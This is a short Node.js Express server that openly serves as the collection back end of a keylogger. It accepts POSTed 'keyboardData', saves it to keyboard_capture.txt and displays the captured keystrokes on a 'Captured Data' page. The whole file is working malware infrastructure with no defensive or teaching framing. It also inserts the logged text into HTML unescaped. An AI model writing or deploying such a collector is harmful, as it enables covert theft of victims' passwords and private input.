const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// create the app
const app = express();

// access body request

app.use(bodyParser.json({extended: true}));

// assign the port number 8080.
const port = 8080;

// get request is made to the "/" resource -> return basic HTML
app.get("/", (req, res) => {
    //get request shows the data that's logged in the keyboard_capture.txt file
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
        // send the txt file data to the server, replace the "\n" with <br> 
        res.send(`<h1>Captured Data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }  
});


app.post("/", (req, res) => {
    // get data from post request
    console.log(req.body.keyboardData);
    // write log to file
    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});
// listening port
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});
